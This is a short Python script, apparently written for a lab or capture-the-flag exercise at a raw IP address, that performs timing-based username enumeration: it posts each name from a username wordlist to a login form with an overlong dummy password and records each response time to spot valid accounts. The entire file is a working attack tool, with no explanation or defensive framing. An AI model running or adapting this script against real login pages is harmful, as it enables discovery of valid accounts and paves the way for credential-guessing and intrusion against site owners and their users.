import requests 
import re  

url = "http://46.101.60.26:31068/question3/"

session = requests.Session()
with open("top-usernames-shortlist.txt", "r") as f:
	wordlist = f.readlines()

time_taken = {}

print("Testing the time taken")
print("======================")
for word in wordlist:
	word = word.rstrip()
	data = {
		"userid": word,
		"passwd": "asdfqwerqwerqwerqwersdfsdafsdfssdfsdfadsfsdfsdfsfsdfwqeasdfwefasdfefasdfef"
	}

	r = session.post(url, data=data)
	print(f"[!] {word: <15} -> {r.elapsed.total_seconds()}")
	time_taken[word] = r.elapsed.total_seconds()
print("======================")
print(time_taken)

